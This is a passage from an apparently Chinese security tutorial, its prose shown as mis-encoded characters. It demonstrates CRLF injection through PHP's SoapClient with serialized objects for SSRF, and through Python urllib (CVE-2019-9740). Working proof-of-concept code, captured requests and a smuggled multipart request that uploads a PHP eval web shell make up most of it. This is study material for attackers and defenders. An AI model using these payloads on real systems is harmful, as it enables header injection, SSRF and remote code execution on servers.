<p>æ²¡æƒ³åˆ°æˆåŠŸå¤ç°äº†ã€‚æ¿€åŠ¨</p>
<pre><code class="highlight plaintext">Listening on 0.0.0.0 9999
Connection received on 60.1x.1xx.1xx 40605
GET / HTTP/1.1
Host: 47.1xx.1x1.1xx:9999
Set-Cookie: PHPSESSID=whoami
Connection: Close</code></pre>

<p>è¿™æ˜¯ç”±äºï¼Œæ­¤æ—¶æœåŠ¡ç«¯æ¥æ”¶åˆ°çš„urlå‚æ•°å€¼æ˜¯æˆ‘ä»¬ä¿®æ”¹åçš„ï¼š</p>
<pre><code class="highlight plaintext">/?url=47.1xx.1x1.1xx:9999%0d%0aSet-Cookie: PHPSESSID=whoami</code></pre>

<p>è€Œåœ¨urlå‚æ•°å€¼æ‹¼æ¥åˆ° Host å­—æ®µå€¼ä¸­ï¼Œè®¾ç½®æˆå“åº”å¤´åï¼Œå“åº”åŒ…æ­¤æ—¶åº”è¯¥æ˜¯å¦‚ä¸‹è¿™æ ·çš„ï¼š</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>47.1xx.1x1.1xx:9999%0d%0aSet-Cookie: PHPSESSID=whoami
<span class="attribute">Connection</span><span class="punctuation">: </span>Close</code></pre>

<p>æ¥ç€å°±ä¼šè¢«å¤„ç†ä¸º</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>47.1xx.1x1.1xx:9999
<span class="attribute">Set-Cookie</span><span class="punctuation">: </span>PHPSESSID=whoami
<span class="attribute">Connection</span><span class="punctuation">: </span>Close</code></pre>

<p>è€Œæˆ‘ä»¬æ„é€ çš„ Set-Cookie å­—ç¬¦åœ¨ HTTP ä¸­æ˜¯ä¸€ä¸ªè®¾ç½® Cookie çš„é¦–éƒ¨å­—æ®µï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šå°† PHPSESSID&#x3D;whoami è®¾ç½®æˆ Cookieã€‚</p>
<h2 id="PHP-SoapClient-ç±»"><a href="#PHP-SoapClient-ç±»" class="headerlink" title="PHP SoapClient ç±»"></a>PHP SoapClient ç±»</h2><p>PHP çš„å†…ç½®ç±» SoapClient æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®WebæœåŠ¡çš„ PHP å®¢æˆ·ç«¯ã€‚è¯¥å†…ç½®ç±»æœ‰ä¸€ä¸ª <code>__call</code> æ–¹æ³•ï¼Œå½“ <code>__call</code> æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚ã€‚æ­£æ˜¯è¿™ä¸ª <code>__call</code> æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚</p>
<p>è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight php"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [ï¼Œ<span class="keyword">array</span> <span class="variable">$options</span> ])</code></pre>

<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚</li>
<li>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œ uri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</li>
</ul>
<p>çŸ¥é“ä¸Šè¿°ä¸¤ä¸ªå‚æ•°çš„å«ä¹‰åï¼Œæˆ‘ä»¬é¦–å…ˆæ¥å‘èµ·ä¸€ä¸ªæ­£å¸¸çš„HTTPè¯·æ±‚ï¼š</p>
<pre><code class="highlight plaintext">&lt;?php
$a = new SoapClient(null,array(&#x27;location&#x27;=&gt;&#x27;http://47.1xx.1x1.1xx:9999/aaa&#x27;, &#x27;uri&#x27;=&gt;&#x27;http://47.1xx.1x1.1xx:9999&#x27;));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c-&gt;a();    // éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf
?&gt;</code></pre>

<p>åœ¨VPSä¸Šç›‘å¬åˆ°äº†POSTè¯·æ±‚</p>
<pre><code class="highlight http"><span class="keyword">POST</span> <span class="string">/aaa</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>47.111.141.135:9999
<span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive
<span class="attribute">User-Agent</span><span class="punctuation">: </span>PHP-SOAP/5.3.29
<span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml; charset=utf-8
<span class="attribute">SOAPAction</span><span class="punctuation">: </span>&quot;http://47.111.141.135:9999#a&quot;
<span class="attribute">Content-Length</span><span class="punctuation">: </span>387

<span class="language-ruby">&lt;<span class="string">?x</span>ml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span><span class="string">?&gt;</span></span>
<span class="language-ruby">&lt;<span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span><span class="symbol">:Envelope</span> <span class="symbol">xmlns:</span><span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="symbol">xmlns:</span>ns1=<span class="string">&quot;http://47.111.141.135:9999&quot;</span> <span class="symbol">xmlns:</span>xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="symbol">xmlns:</span><span class="variable constant_">SOAP</span>-<span class="variable constant_">ENC</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span><span class="symbol">:encodingStyle=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;&lt;SOAP-ENV</span><span class="symbol">:Body&gt;&lt;ns1</span><span class="symbol">:a/&gt;&lt;/SOAP-ENV</span><span class="symbol">:Body&gt;&lt;/SOAP-ENV</span><span class="symbol">:Envelope&gt;</span></span></code></pre>

<p>æ¥ä¸‹æ¥å°±å°è¯•CRLFæ³¨å…¥,æ’å…¥ä»»æ„çš„HTTPå¤´</p>
<h3 id="åœ¨-User-Agent-å¤´éƒ¨æ³¨å…¥"><a href="#åœ¨-User-Agent-å¤´éƒ¨æ³¨å…¥" class="headerlink" title="åœ¨ User-Agent å¤´éƒ¨æ³¨å…¥"></a>åœ¨ User-Agent å¤´éƒ¨æ³¨å…¥</h3><pre><code class="highlight PHP"><span class="meta">&lt;?php</span>
<span class="variable">$target</span> = <span class="string">&#x27;http://47.111.141.135:9999/&#x27;</span>;
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;WHOAMI\r\nSet-Cookie: PHPSESSID=whoami&quot;</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>));
<span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
<span class="keyword">echo</span> <span class="variable">$b</span>;
<span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);
<span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span>
<span class="meta">?&gt;</span></code></pre>

<p>VPS ä¸Šç›‘å¬åˆ°äº†è¯·æ±‚ï¼ŒæˆåŠŸåœ¨HTTPå¤´ä¸­æ’å…¥äº†ä¸€ä¸ªæˆ‘ä»¬è‡ªå®šä¹‰çš„ cookieï¼š</p>
<pre><code class="highlight http"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>47.111.141.135:9999
<span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive
<span class="attribute">User-Agent</span><span class="punctuation">: </span>WHOAMI
<span class="attribute">Set-Cookie</span><span class="punctuation">: </span>PHPSESSID=whoami
<span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml; charset=utf-8
<span class="attribute">SOAPAction</span><span class="punctuation">: </span>&quot;test#a&quot;
<span class="attribute">Content-Length</span><span class="punctuation">: </span>365

<span class="language-ruby">&lt;<span class="string">?x</span>ml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span><span class="string">?&gt;</span></span>
<span class="language-ruby">&lt;<span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span><span class="symbol">:Envelope</span> <span class="symbol">xmlns:</span><span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="symbol">xmlns:</span>ns1=<span class="string">&quot;test&quot;</span> <span class="symbol">xmlns:</span>xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="symbol">xmlns:</span><span class="variable constant_">SOAP</span>-<span class="variable constant_">ENC</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span><span class="symbol">:encodingStyle=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;&lt;SOAP-ENV</span><span class="symbol">:Body&gt;&lt;ns1</span><span class="symbol">:a/&gt;&lt;/SOAP-ENV</span><span class="symbol">:Body&gt;&lt;/SOAP-ENV</span><span class="symbol">:Envelope&gt;</span></span></code></pre>



<h3 id="å‘é€-POST-æ•°æ®åŒ…"><a href="#å‘é€-POST-æ•°æ®åŒ…" class="headerlink" title="å‘é€ POST æ•°æ®åŒ…"></a>å‘é€ POST æ•°æ®åŒ…</h3><p>åœ¨HTTPåè®®ä¸­ï¼ŒHTTP Header éƒ¨åˆ†ä¸ HTTP Body éƒ¨åˆ†æ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å‘é€ POST æ•°æ®å°±è¦æ’å…¥ä¸¤ä¸ªCRLFã€‚</p>
<p>å¯¹äºå¦‚ä½•å‘é€POSTçš„æ•°æ®åŒ…ï¼Œè¿™é‡Œé¢è¿˜æœ‰ä¸€ä¸ªå‘ï¼Œå°±æ˜¯ <code>Content-Type</code> çš„è®¾ç½®ï¼Œå› ä¸ºæˆ‘ä»¬è¦æäº¤çš„æ˜¯POSTæ•°æ®ï¼Œæ‰€ä»¥ <code>Content-Type</code> çš„å€¼æˆ‘ä»¬è¦è®¾ç½®ä¸º <code>application/x-www-form-urlencoded</code>ï¼Œè¿™é‡Œå¦‚ä½•ä¿®æ”¹ <code>Content-Type</code> çš„å€¼å‘¢ï¼Ÿç”±äº <code>Content-Type</code> åœ¨ <code>User-Agent</code> çš„ä¸‹é¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>SoapClient</code> æ¥è®¾ç½® <code>User-Agent</code> ï¼Œå°†åŸæ¥çš„ <code>Content-Type</code> æŒ¤ä¸‹å»ï¼Œä»è€Œå†æ’å…¥ä¸€ä¸ªæ–°çš„ <code>Content-Type</code> ã€‚</p>
<p>æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$target</span> = <span class="string">&#x27;http://47.111.141.135:9999/&#x27;</span>;
<span class="variable">$post_data</span> = <span class="string">&#x27;data=whoami&#x27;</span>;
<span class="variable">$headers</span> = <span class="keyword">array</span>(
    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,
    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span>
);
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;WHOAMI^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_data</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>));
<span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
<span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>);
<span class="keyword">echo</span> <span class="variable">$b</span>;
<span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);
<span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span>
<span class="meta">?&gt;</span></code></pre>

<p>VPS ä¸Šç›‘å¬åˆ°äº† POST æ•°æ®ï¼š</p>
<pre><code class="highlight plaintext">POST / HTTP/1.1
Host: 47.111.141.135:9999
Connection: Keep-Alive
User-Agent: WHOAMI
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93
Content-Length: 11

data=whoami
Content-Type: text/xml; charset=utf-8
SOAPAction: &quot;test#a&quot;
Content-Length: 365

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;test&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</code></pre>



<h2 id="Python-urllib-CRLF-æ³¨å…¥æ¼æ´ï¼ˆCVE-2019-9740ï¼‰"><a href="#Python-urllib-CRLF-æ³¨å…¥æ¼æ´ï¼ˆCVE-2019-9740ï¼‰" class="headerlink" title="Python urllib CRLF æ³¨å…¥æ¼æ´ï¼ˆCVE-2019-9740ï¼‰"></a>Python urllib CRLF æ³¨å…¥æ¼æ´ï¼ˆCVE-2019-9740ï¼‰</h2><p>Python 2.xç‰ˆæœ¬è‡³2.7.16ç‰ˆæœ¬ä¸­çš„urllib2å’ŒPython 3.xç‰ˆæœ¬è‡³3.7.2ç‰ˆæœ¬ä¸­çš„urllibå­˜åœ¨æ³¨å…¥æ¼æ´ã€‚è¯¥æ¼æ´æºäºç”¨æˆ·è¾“å…¥æ„é€ å‘½ä»¤ã€æ•°æ®ç»“æ„æˆ–è®°å½•çš„æ“ä½œè¿‡ç¨‹ä¸­ï¼Œç½‘ç»œç³»ç»Ÿæˆ–äº§å“ç¼ºä¹å¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„æ­£ç¡®éªŒè¯ï¼Œæœªè¿‡æ»¤æˆ–æœªæ­£ç¡®è¿‡æ»¤æ‰å…¶ä¸­çš„ç‰¹æ®Šå…ƒç´ ï¼Œå¯¼è‡´ç³»ç»Ÿæˆ–äº§å“äº§ç”Ÿè§£ææˆ–è§£é‡Šæ–¹å¼é”™è¯¯ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯urlopen()å¤„ç†URLçš„æ—¶å€™æ²¡æœ‰è€ƒè™‘æ¢è¡Œç¬¦ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥åœ¨æ­£å¸¸çš„HTTPå¤´ä¸­æ’å…¥ä»»æ„å†…å®¹ã€‚</p>
<p>è¯¥æ¼æ´æ—©åœ¨2016å¹´å°±è¢«çˆ†å‡ºï¼ˆCVE-2016-5699ï¼‰ï¼Œåœ¨ä¹‹åçš„ä¸€æ®µæ—¶é—´é‡Œä¸æ–­çˆ†å‡ºäº†pythonå…¶ä»–ç‰ˆæœ¬ä¹Ÿå­˜åœ¨è¯¥æ¼æ´ï¼ˆCVE-2019-9740ã€CVE-2019-9947ï¼‰ã€‚</p>
<p><strong>å½±å“èŒƒå›´ï¼š</strong></p>
<ul>
<li>Python 2.xç‰ˆæœ¬è‡³2.7.16ç‰ˆæœ¬ä¸­çš„urllib2</li>
<li>Python 3.xç‰ˆæœ¬è‡³3.7.2ç‰ˆæœ¬ä¸­çš„urllib</li>
</ul>
<p>è¿™é‡Œæ‡’å¾—å†ä¸‹ä¸ªç‰ˆæœ¬å†å¤ç°äº†ï¼Œç›´æ¥å¼•ç”¨å…¶ä»–å¸ˆå‚…çš„è®°å½•å§</p>
<h3 id="åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ"><a href="#åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ" class="headerlink" title="åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ"></a>åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ</h3><p>æµ‹è¯•ä»£ç ï¼š</p>
<pre><code class="highlight python"><span class="comment">#!python</span>
<span class="comment">#!/usr/bin/env python3</span>
<span class="keyword">import</span> urllib
<span class="keyword">import</span> urllib.request
<span class="keyword">import</span> urllib.error

<span class="comment"># url = &quot;http://47.101.57.72:4000</span>
url = <span class="string">&quot;http://47.101.57.72:4000?a=1 HTTP/1.1\r\nCRLF-injection: True\r\nSet-Cookie: PHPSESSID=whoami&quot;</span>
<span class="comment"># ?a=1 åé¢çš„é‚£ä¸ªHTTP/1.1æ˜¯ä¸ºäº†é—­åˆæ­£å¸¸çš„HTTPçŠ¶æ€è¡Œ</span>
<span class="keyword">try</span>:
    info = urllib.request.urlopen(url).info()
    <span class="built_in">print</span>(info)

<span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:
    <span class="built_in">print</span>(e)</code></pre>

<p>æ‰§è¡Œä»£ç åï¼ŒVPS ä¸Šä¼šç›‘å¬åˆ°å¦‚ä¸‹HTTPå¤´ï¼š</p>
<p><img src="https://p3.ssl.qhimg.com/t017291c25d0d4a0fc3.png" alt="img"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸå¼•å‘äº†CRLFæ¼æ´ã€‚</p>
<p>è¿™æ˜¯ç”±äºæœåŠ¡ç«¯æ¥æ”¶åˆ°æˆ‘ä»¬ä¿®æ”¹åçš„è¯·æ±‚åï¼Œå“åº”åŒ…æ­¤æ—¶åº”è¯¥æ˜¯å¦‚ä¸‹è¿™æ ·çš„ï¼š</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span>%0d%0a<span class="keyword">CRLF</span>-injection: <span class="string">True%0d%0aSet-Cookie:</span> <span class="keyword">PHPSESSID</span>=whoami <span class="string">HTTP/1.1</span>
<span class="string">Accept-Encoding:</span> identity
<span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000
<span class="attribute">User-Agent</span><span class="punctuation">: </span>Python-urllib/3.7
<span class="attribute">Connection</span><span class="punctuation">: </span>close</code></pre>

<p>æ­¤æ—¶ï¼ŒHTTP çŠ¶æ€è¡Œä¸­å‡ºç°äº†%0d%0aï¼Œä¾¿ä¼šè¢«è§£æä¸ºHTTPé¦–éƒ¨å­—æ®µçš„ç»“æŸå¹¶æˆåŠŸæ’å…¥æˆ‘ä»¬å®šåˆ¶çš„HTTPé¦–éƒ¨å­—æ®µã€‚æœ€ç»ˆHTTPè¯·æ±‚å˜æˆäº†ä¸‹é¢è¿™æ ·ï¼š</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">CRLF-injection</span><span class="punctuation">: </span>True
<span class="attribute">Set-Cookie</span><span class="punctuation">: </span>PHPSESSID=whoami HTTP/1.1
<span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>identity
<span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000
<span class="attribute">User-Agent</span><span class="punctuation">: </span>Python-urllib/3.7
<span class="attribute">Connection</span><span class="punctuation">: </span>close</code></pre>

<h3 id="åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´-HTTP-è¯·æ±‚"><a href="#åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´-HTTP-è¯·æ±‚" class="headerlink" title="åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´ HTTP è¯·æ±‚"></a>åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´ HTTP è¯·æ±‚</h3><p>é¦–å…ˆï¼Œç”±äº Python Urllib çš„è¿™ä¸ª CRLF æ³¨å…¥ç‚¹åœ¨ HTTP çŠ¶æ€è¡Œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦æ³¨å…¥å®Œæ•´çš„ HTTP è¯·æ±‚çš„è¯éœ€è¦å…ˆé—­åˆçŠ¶æ€è¡Œä¸­ <code>HTTP/1.1</code> ï¼Œå³ä¿è¯æ³¨å…¥åæœ‰æ­£å¸¸çš„ HTTP çŠ¶æ€è¡Œã€‚å…¶æ¬¡ä¸ºäº†ä¸è®©åŸæ¥çš„ <code>HTTP/1.1</code> å’Œ Host å­—æ®µå½±å“æˆ‘ä»¬æ–°æ„é€ çš„è¯·æ±‚ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å†æ„é€ ä¸€æ¬¡ <code>GET /</code> é—­åˆåŸæ¥çš„ HTTP è¯·æ±‚ã€‚</p>
<p>å‡è®¾ç›®æ ‡ä¸»æœºå­˜åœ¨SSRFï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç›®æ ‡ä¸»æœºæœ¬åœ°ä¸Šä¼ æ–‡ä»¶ã€‚ä¸‹é¢å°è¯•æ„é€ å¦‚ä¸‹è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ çš„å®Œæ•´ POST è¯·æ±‚ï¼š</p>
<pre><code class="highlight http"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1
<span class="attribute">Content-Length</span><span class="punctuation">: </span>437
<span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
<span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
<span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
<span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate
<span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9
<span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=nk67astv61hqanskkddslkgst4
<span class="attribute">Connection</span><span class="punctuation">: </span>close

<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span></span>
<span class="language-php"></span>
<span class="language-php"><span class="number">100000</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span>
<span class="language-php">Content-Type: application/octet-stream</span>
<span class="language-php"></span>
<span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span>
<span class="language-php"></span>
<span class="language-php">Upload</span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></code></pre>

<p>ç¼–å†™è„šæœ¬æ„é€ payloadï¼š</p>
<pre><code class="highlight python">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span>
<span class="string"></span>
<span class="string">POST /upload.php HTTP/1.1</span>
<span class="string">Host: 127.0.0.1</span>
<span class="string">Content-Length: 435</span>
<span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span>
<span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="string">Accept-Encoding: gzip, deflate</span>
<span class="string">Accept-Language: zh-CN,zh;q=0.9</span>
<span class="string">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span>
<span class="string">Connection: close</span>
<span class="string"></span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span>
<span class="string"></span>
<span class="string">100000</span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;</span>
<span class="string">Content-Type: application/octet-stream</span>
<span class="string"></span>
<span class="string">&lt;?php eval($_POST[whoami]);?&gt;</span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">Content-Disposition: form-data; name=&quot;Upload&quot;</span>
<span class="string"></span>
<span class="string">Upload</span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span>
<span class="string"></span>
<span class="string">GET / HTTP/1.1</span>
<span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\\r\\n&quot;</span>)

<span class="built_in">print</span>(payload)

<span class="comment"># è¾“å‡º: HTTP/1.1\r\n\r\nPOST /upload.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 435\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nCookie: PHPSESSID=nk67astv61hqanskkddslkgst4\r\nConnection: close\r\n\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;\r\n\r\n100000\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;\r\nContent-Type: application/octet-stream\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;Upload&quot;\r\n\r\nUpload\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\r\n\r\nGET / HTTP/1.1\r\ntest:</span></code></pre>

